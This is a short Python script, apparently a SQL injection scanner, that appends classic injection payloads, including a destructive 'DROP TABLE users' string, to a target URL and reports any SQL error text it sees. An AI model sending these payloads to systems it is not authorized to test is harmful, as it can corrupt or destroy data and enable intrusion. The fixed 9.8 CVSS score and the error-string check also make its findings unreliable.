import requests
from utils.logger import setup_logger

logger = setup_logger()

def scan_sql_injection(target_url):
    payloads = ["' OR '1'='1", "' OR 1=1 --", "'; DROP TABLE users; --"]
    risk_score = 9.8
    severity = "Critical"
    vulnerable = False

    for payload in payloads:
        test_url = f"{target_url}?id={payload}"
        try:
            response = requests.get(test_url, timeout=5)
            if any(error in response.text.lower() for error in ["sql", "syntax", "mysql", "warning"]):
                logger.info(f"SQLi Detected | URL: {test_url} | Payload: {payload} | CVSS: {risk_score} | Severity: {severity}")
                vulnerable = True
        except requests.exceptions.RequestException as e:
            logger.warning(f"Request failed for {test_url}: {e}")
    
    if not vulnerable:
        logger.info(f"No SQLi vulnerabilities detected for {target_url}")
